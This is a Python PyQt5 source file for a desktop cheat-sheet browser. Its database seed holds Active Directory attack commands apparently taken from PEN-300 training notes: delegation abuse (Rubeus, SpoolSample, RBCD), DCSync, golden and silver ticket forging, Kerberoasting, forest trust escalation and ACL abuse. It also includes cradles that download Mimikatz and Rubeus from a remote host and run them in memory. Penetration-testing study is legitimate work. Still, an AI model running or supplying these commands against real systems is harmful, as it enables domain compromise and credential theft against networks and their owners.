import sqlite3
import os
import sys
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QSplitter, 
                             QTreeWidget, QTreeWidgetItem, QTextEdit, QLabel, 
                             QPushButton, QLineEdit, QApplication, QFrame)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QIcon, QFont, QColor

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# ---------------------------------------------------------
# DATABASE MANAGER
# ---------------------------------------------------------
class ActiveDirectoryDB:
    def __init__(self, db_path=None):
        self.db_path = resource_path(os.path.join("resources", "ad_cheatsheet.db"))
        self.init_db()

    def init_db(self):
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ad_sheets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                category TEXT,      -- Delegation, Lateral Mov, Enumeration, etc.
                title TEXT,         -- Technique Name
                description TEXT,   -- Context
                code TEXT           -- Commands
            )
        ''')
        
        cursor.execute('SELECT count(*) FROM ad_sheets')
        if cursor.fetchone()[0] == 0:
            self.seed_data(cursor)
        
        conn.commit()
        conn.close()

    def get_all_entries(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT id, category, title FROM ad_sheets ORDER BY category, title")
        data = cursor.fetchall()
        conn.close()
        return data

    def get_entry_details(self, entry_id):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT title, description, code FROM ad_sheets WHERE id=?", (entry_id,))
        data = cursor.fetchone()
        conn.close()
        return data

    def seed_data(self, cursor):
        """Populates the DB with data from PEN-300 Active Directory Snippets."""
        data = [
            # =================================================================
            # ENUMERATION
            # Source: Active Directory/Enumeration.md
            # =================================================================
            ("Enumeration", "SharpHound (BloodHound)", 
             "Run the SharpHound ingestor to collect data for BloodHound.",
             "Invoke-SharpHound -CollectionMethod All"),

            ("Enumeration", "ACLs for Current User (PowerView)", 
             "Search for ACEs applicable to the current user.",
             "Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(\"$env:UserDomain\\$env:Username\")) {$_}}"),

            ("Enumeration", "Find Delegation Configs", 
             "Identify computers/users with delegation configurations.",
             "# Unconstrained\nGet-DomainComputer -Unconstrained\n\n# Constrained\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth"),

            ("Enumeration", "Trust Enumeration", 
             "List domain and forest trusts.",
             "Get-DomainTrust\nGet-DomainTrust -API\nGet-DomainTrustMapping"),

            # =================================================================
            # DELEGATION ATTACKS
            # Source: Active Directory/Unconstrained delegation step by step.md
            # Source: Active Directory/Constrained delegation step by step.md
            # Source: Active Directory/RBCD step by step.md
            # =================================================================
            ("Delegation Attacks", "Unconstrained Delegation Attack", 
             "Coerce authentication (PrinterBug) to a server with Unconstrained Delegation to capture a TGT.",
             "# 1. Monitor for TGT\n"
             "Rubeus.exe monitor /interval:5 /filteruser:CDC01$\n\n"
             "# 2. Coerce Auth (SpoolSample)\n"
             "SpoolSample.exe CDC01 APPSRV01\n\n"
             "# 3. Inject TGT\n"
             "Rubeus.exe ptt /ticket:<BASE64_TICKET>\n\n"
             "# 4. DCSync\n"
             "lsadump::dcsync /domain:contoso.com /user:contoso\\krbtgt"),

            ("Delegation Attacks", "Constrained Delegation (S4U)", 
             "Abuse 'TrustedToAuth' to impersonate users to specific services.",
             "# 1. Calculate Hash of Service Account\n"
             "Rubeus.exe hash /password:lab\n\n"
             "# 2. AskTGT\n"
             "Rubeus.exe asktgt /user:iisvc /domain:contoso.com /rc4:<HASH>\n\n"
             "# 3. S4U (Impersonate Admin)\n"
             "Rubeus.exe s4u /ticket:<TGT> /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.contoso.com:1433 /ptt"),

            ("Delegation Attacks", "RBCD (Resource Based)", 
             "Configure delegation on a target object if you have Write permissions (GenericWrite/WriteDACL).",
             "# 1. Create Fake Computer\n"
             "New-MachineAccount -MachineAccount myComputer -Password h4x\n\n"
             "# 2. Get SID of Fake Computer\n"
             "$sid = Get-DomainComputer myComputer -Properties objectsid | Select -Expand objectsid\n\n"
             "# 3. Write msDS-AllowedToActOnBehalfOfOtherIdentity\n"
             "$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))\"\n"
             "$SDbytes = New-Object byte[] ($SD.BinaryLength)\n"
             "$SD.GetBinaryForm($SDbytes,0)\n"
             "Get-DomainComputer appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\n"
             "# 4. Request TGS\n"
             "Rubeus.exe s4u /user:myComputer$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:CIFS/appsrv01.contoso.com /ptt"),

            # =================================================================
            # LATERAL MOVEMENT & TICKETS
            # Source: Active Directory/Lateral Movement.md
            # =================================================================
            ("Lateral Movement", "Invoke-Mimikatz (Reflective)", 
             "Run Mimikatz in memory bypassing AMSI.",
             "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX\n"
             "Invoke-Mimikatz -Command \"`\"sekurlsa::pth /user:admin /domain:contoso.com /ntlm:<HASH> /run:PowerShell.exe`\"\""),

            ("Lateral Movement", "Rubeus (Reflective)", 
             "Run Rubeus in memory via .NET reflection.",
             "$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')\n"
             "$assem = [System.Reflection.Assembly]::Load($data)\n"
             "[Rubeus.Program]::Main(\"asktgt /user:user /rc4:<HASH> /ptt\".Split())"),

            ("Lateral Movement", "Pass The Ticket", 
             "Inject Kerberos tickets (.kirbi) into the current session.",
             "# Mimikatz\n"
             "kerberos::ptt 'C:\\ticket.kirbi'\n\n"
             "# Rubeus\n"
             "Rubeus.exe ptt /ticket:<ticket_kirbi_file>"),

            ("Lateral Movement", "Golden Ticket", 
             "Forge a TGT using the krbtgt hash (Persistence).",
             "kerberos::golden /user:fakeuser /domain:contoso.com /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt"),

            ("Lateral Movement", "Silver Ticket", 
             "Forge a TGS for a specific service using the service account's hash.",
             "kerberos::golden /user:fakeuser /domain:contoso.com /sid:<DOMAIN_SID> /target:server.contoso.com /service:MSSQL /rc4:<SERVICE_HASH> /ptt"),

            ("Lateral Movement", "AS-REP Roasting", 
             "Attack users with 'Do not require Kerberos preauthentication'.",
             "# Rubeus\n"
             "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n\n"
             "# Impacket\n"
             "impacket-GetNPUsers.py domain/ -usersfile users.txt -format hashcat"),

            ("Lateral Movement", "Kerberoasting", 
             "Request TGS for service accounts to crack offline.",
             "# Impacket\n"
             "impacket-getuserspns -request domain/user:pass\n\n"
             "# Rubeus\n"
             "Rubeus.exe kerberoast /outfile:hashes.txt"),

            # =================================================================
            # FOREST ATTACKS
            # Source: Active Directory/Intra forest explotation.md
            # Source: Active Directory/Inter forest explotation.md
            # =================================================================
            ("Forest Attacks", "Intra-Forest (ExtraSIDs)", 
             "Compromise parent/child domains using Golden Tickets with ExtraSIDs.",
             "kerberos::golden /user:h4x /domain:child.contoso.com /sid:<CHILD_SID> /krbtgt:<CHILD_KRBTGT> /sids:<PARENT_DOMAIN_SID>-519 /ptt\n"
             "# SID-519 is Enterprise Admins"),

            ("Forest Attacks", "Inter-Forest (SID History)", 
             "Compromise external forests via Trust abuse (Requires SID History enabled).",
             "# 1. Enable SID History (If Admin on Trust Root)\n"
             "netdom trust target.com /d:source.com /enablesidhistory:yes\n\n"
             "# 2. Forge Ticket with SID History\n"
             "kerberos::golden /user:h4x /domain:source.com /sid:<SOURCE_SID> /krbtgt:<HASH> /sids:<TARGET_GROUP_SID> /ptt\n"
             "# Target RID must be >= 1000 for external trusts"),

            # =================================================================
            # ACL ABUSE
            # Source: Active Directory/Abusing ACLs.md
            # =================================================================
            ("ACL Abuse", "GenericAll (User)", 
             "Reset user password if you have GenericAll rights.",
             "net user targetUser NewPassword123! /domain"),

            ("ACL Abuse", "GenericAll (Group)", 
             "Add yourself to a group if you have GenericAll rights.",
             "net group targetGroup hackerUser /add /domain"),

            ("ACL Abuse", "WriteDACL", 
             "Grant yourself 'GenericAll' rights if you have WriteDACL.",
             "Add-DomainObjectAcl -TargetIdentity targetUser -PrincipalIdentity attackerUser -Rights All")
        ]
        
        cursor.executemany('INSERT INTO ad_sheets (category, title, description, code) VALUES (?,?,?,?)', data)


# ---------------------------------------------------------
# UI WIDGET
# ---------------------------------------------------------
class ActiveDirectoryWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.db = ActiveDirectoryDB()
        
        self.layout = QVBoxLayout(self)
        self.layout.setContentsMargins(0, 0, 0, 0)
        self.layout.setSpacing(10)

        # Search
        self.search_bar = QLineEdit()
        self.search_bar.setPlaceholderText("🔍 Search AD techniques (e.g. 'Rubeus', 'Delegation', 'Forest')...")
        self.search_bar.setStyleSheet("""
            QLineEdit {
                background-color: #2f2f40; color: #00d2ff;
                border: 1px solid #444; border-radius: 15px;
                padding: 8px 15px; font-size: 14px;
            }
            QLineEdit:focus { border: 1px solid #00d2ff; }
        """)
        self.search_bar.textChanged.connect(self.filter_tree)
        self.layout.addWidget(self.search_bar)

        # Splitter
        self.splitter = QSplitter(Qt.Horizontal)
        self.layout.addWidget(self.splitter)

        # Tree
        self.tree = QTreeWidget()
        self.tree.setHeaderHidden(True)
        self.tree.setStyleSheet("""
            QTreeWidget {
                background-color: #1e1e2f; color: #e0e0e0;
                border: 1px solid #333; font-size: 14px;
            }
            QTreeWidget::item { padding: 5px; }
            QTreeWidget::item:hover { background-color: #2f2f40; }
            QTreeWidget::item:selected { background-color: #00d2ff; color: #1e1e2f; }
        """)
        self.tree.itemClicked.connect(self.on_item_clicked)
        self.splitter.addWidget(self.tree)

        # Details
        self.detail_frame = QFrame()
        self.detail_frame.setStyleSheet("background-color: #1e1e2f;")
        self.detail_layout = QVBoxLayout(self.detail_frame)
        self.detail_layout.setContentsMargins(20, 0, 0, 0)
        
        self.lbl_title = QLabel("Select an AD Technique")
        self.lbl_title.setFont(QFont("Arial", 22, QFont.Bold))
        self.lbl_title.setStyleSheet("color: #00d2ff; margin-bottom: 10px;")
        
        self.lbl_desc = QLabel("Navigate the categories on the left to view Active Directory cheat sheets.")
        self.lbl_desc.setWordWrap(True)
        self.lbl_desc.setStyleSheet("color: #a0a0b0; font-size: 14px; font-style: italic; margin-bottom: 15px;")
        
        self.code_viewer = QTextEdit()
        self.code_viewer.setReadOnly(True)
        self.code_viewer.setStyleSheet("""
            QTextEdit {
                background-color: #1e1e24;       /* Darker, flatter background */
                color: #e0e6ed;                  /* Soft white text */
                font-family: 'Consolas', 'Menlo', 'Courier New', monospace;
                font-size: 15px;                 /* INCREASED SIZE */
                border: 1px solid #444; 
                border-radius: 6px; 
                padding: 20px;                   /* More padding */
                selection-background-color: #00d2ff;
                selection-color: #000000;
            }
        """)
        # --------------------------
        
        self.btn_copy = QPushButton("📋 Copy Command")
        self.btn_copy.setCursor(Qt.PointingHandCursor)
        self.btn_copy.setStyleSheet("""
            QPushButton {
                background-color: #00d2ff; color: #1e1e2f; font-weight: bold;
                padding: 10px; border-radius: 5px; border: none; font-size: 14px;
            }
            QPushButton:hover { background-color: #3a7bd5; color: white; }
        """)
        self.btn_copy.clicked.connect(self.copy_code)
        
        self.detail_layout.addWidget(self.lbl_title)
        self.detail_layout.addWidget(self.lbl_desc)
        self.detail_layout.addWidget(QLabel("Command / Code:"))
        self.detail_layout.addWidget(self.code_viewer)
        self.detail_layout.addWidget(self.btn_copy, alignment=Qt.AlignRight)
        
        self.splitter.addWidget(self.detail_frame)
        self.splitter.setSizes([300, 700])
        
        self.populate_tree()

    def populate_tree(self):
        self.tree.clear()
        data = self.db.get_all_entries() # [(id, category, title), ...]
        
        categories = {}
        for entry_id, cat, title in data:
            if cat not in categories:
                categories[cat] = []
            categories[cat].append((title, entry_id))

        for cat_name, items in categories.items():
            cat_item = QTreeWidgetItem(self.tree)
            cat_item.setText(0, cat_name)
            cat_item.setIcon(0, QIcon.fromTheme("network-server")) # Generic server icon
            cat_item.setForeground(0, QColor("#00d2ff"))
            font = cat_item.font(0)
            font.setBold(True)
            cat_item.setFont(0, font)
            cat_item.setExpanded(True)

            for title, entry_id in items:
                item = QTreeWidgetItem(cat_item)
                item.setText(0, title)
                item.setData(0, Qt.UserRole, entry_id)

    def on_item_clicked(self, item, column):
        entry_id = item.data(0, Qt.UserRole)
        if entry_id:
            data = self.db.get_entry_details(entry_id)
            if data:
                title, desc, code = data
                self.lbl_title.setText(title)
                self.lbl_desc.setText(desc)
                
                # --- ENHANCED FORMATTING ---
                # Converts raw text to HTML to colorize comments
                import html
                escaped_code = html.escape(code)
                lines = escaped_code.split('\n')
                styled_lines = []
                for line in lines:
                    # Highlight comments in Green/Grey
                    if line.strip().startswith('#'):
                        styled_lines.append(f'<span style="color: #6A9955; font-style: italic;">{line}</span>')
                    # Highlight headers/keys (optional logic)
                    elif line.strip().startswith('1.') or "://" in line:
                         styled_lines.append(f'<span style="color: #569CD6;">{line}</span>')
                    else:
                        styled_lines.append(line)
                
                final_html = "<br>".join(styled_lines)
                self.code_viewer.setHtml(final_html)
                # ---------------------------

    def filter_tree(self, text):
        text = text.lower()
        for i in range(self.tree.topLevelItemCount()):
            cat_item = self.tree.topLevelItem(i)
            cat_visible = False
            for j in range(cat_item.childCount()):
                leaf = cat_item.child(j)
                if text in leaf.text(0).lower():
                    leaf.setHidden(False)
                    cat_visible = True
                else:
                    leaf.setHidden(True)
            cat_item.setHidden(not cat_visible)

    def copy_code(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.code_viewer.toPlainText())
        self.btn_copy.setText("✅ Copied!")
        QApplication.processEvents()
        # Reset button text after delay (handled by next interaction or timer if implemented)
